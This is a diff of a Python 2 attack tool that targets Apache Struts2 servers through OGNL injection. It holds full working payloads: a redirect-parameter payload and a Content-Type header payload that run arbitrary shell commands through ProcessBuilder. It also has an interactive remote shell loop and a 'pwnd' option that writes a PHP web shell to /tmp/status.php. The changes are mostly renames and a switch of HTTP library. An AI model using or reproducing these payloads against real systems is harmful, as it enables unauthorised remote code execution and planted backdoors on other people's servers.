@@ -42,9 +42,9 @@ if len(host) > 0:
 
 		poc = "?redirect:${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27mamalo%27%29,%23w.flush%28%29,%23w.close%28%29}"
 		
-		def exploit(comando):
-			exploit = "?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{"+comando+"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}"
-			return exploit
+		def exploit1(comando):
+			exploit1 = "?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{"+comando+"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}"
+			return exploit1
 
 		def exploit2(comando):
 			exploit2 = "Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='"+str(comando)+"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'cmd.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}"
@@ -99,7 +99,7 @@ if len(host) > 0:
 					comando = "','".join(espacio)
 
 					if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
-						shell = urllib2.urlopen(host+exploit("'"+str(comando)+"'"))
+						shell = urllib2.urlopen(host+exploit1("'"+str(comando)+"'"))
 						print "\n"+shell.read()
 					elif espacio[0] == 'pwnd':
 						pathsave=raw_input("path EJ:/tmp/: ")
@@ -107,7 +107,7 @@ if len(host) > 0:
 						if espacio[1] == 'php':
 							shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
 							urllib2.urlopen(host+pwnd(str(shellfile)))
-							shell = urllib2.urlopen(host+exploit("'ls','-l','"+pathsave+"status.php'"))
+							shell = urllib2.urlopen(host+exploit1("'ls','-l','"+pathsave+"status.php'"))
 							if shell.read().find(pathsave+"status.php") != -1:
 								print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
 							else:
@@ -170,7 +170,8 @@ if len(host) > 0:
 				file_path = '/'
 			
 			valida = validador()[x]
-			try:	
+
+			try:
 				result = requests.get(site+"/"+exploit3(str(valida))+file_path).text
 
 				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("uid=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
@@ -183,17 +184,14 @@ if len(host) > 0:
 					if opcion == 's':
 						print YELLOW+"   [-] GET PROMPT...\n"+ENDC
 						time.sleep(1)
-						print BOLD+"   * [UPLOAD SHELL]"+ENDC
-						print OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC
 
 					  	while 1:
 							separador = raw_input(GREEN+"Struts2@Shell_3:$ "+ENDC)
 							espacio = separador.split(' ')
 							comando = "%20".join(espacio)
 
-							shell = urllib2.urlopen(host+exploit3(str(comando)))
-							print "\n"+shell.read()
-							
+							shell = requests.get(site+"/"+exploit3(str(comando))+file_path)
+							print "\n"+shell.text
 					else:
 						x = len(validador())
 						exit(0)
